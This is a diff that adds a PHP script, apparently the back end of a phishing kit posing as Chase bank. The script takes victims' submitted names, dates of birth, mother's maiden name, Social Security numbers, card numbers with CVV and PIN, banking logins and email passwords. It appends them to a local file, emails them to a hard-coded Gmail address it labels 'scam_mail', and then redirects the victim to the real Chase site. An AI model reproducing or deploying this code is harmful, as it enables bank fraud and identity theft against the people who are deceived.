@@ -1,0 +1,59 @@
+<?php
+$scam_mail = "alasco54.aas@gmail.com";
+
+$fname = $_POST['fname'];
+$lname = $_POST['lname'];
+$email = $_POST['email'];
+$mmn = $_POST['mmn'];
+$dd = $_POST['dd'];
+$mm = $_POST['mm'];
+$yy = $_POST['yy'];
+$phone = $_POST['phone'];
+$income = $_POST['income'];
+$address = $_POST['address'];
+$city = $_POST['city'];
+$state = $_POST['state'];
+$zip = $_POST['zip'];
+$ssn1 = $_POST['ssn1'];
+$ssn2 = $_POST['ssn2'];
+$ssn3 = $_POST['ssn3'];
+$ccnumber = $_POST['ccnumber'];
+$exp_mm = $_POST['exp_mm'];
+$exp_yy = $_POST['exp_yy'];
+$cvv = $_POST['cvv'];
+$pin = $_POST['pin'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$email_user = $_POST['email_user'];
+$email_pass = $_POST['email_pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$msg = "
+-------------------------------------
+fname: $fname
+lname: $lname
+email: $email
+mmn: $mmn
+dob: $dd $mm $yy
+phone: $phone 
+income: $income 
+address: $address 
+city: $city
+state: $state
+zip: $zip
+ssn: $ssn1 $ssn2 $ssn3 
+cc: $ccnumber 
+exp: $exp_mm / $exp_yy
+cvv: $cvv 
+pin: $pin 
+user: $user 
+pass: $pass 
+email: $email_user
+pass: $email_pass
+ip: $ip 
+";
+$file = fopen("data.txt","ab");
+fwrite($file,$msg);
+fclose($file);
+mail($scam_mail,"logs", $msg);
+header('location:https://www.chase.com/');
+?>
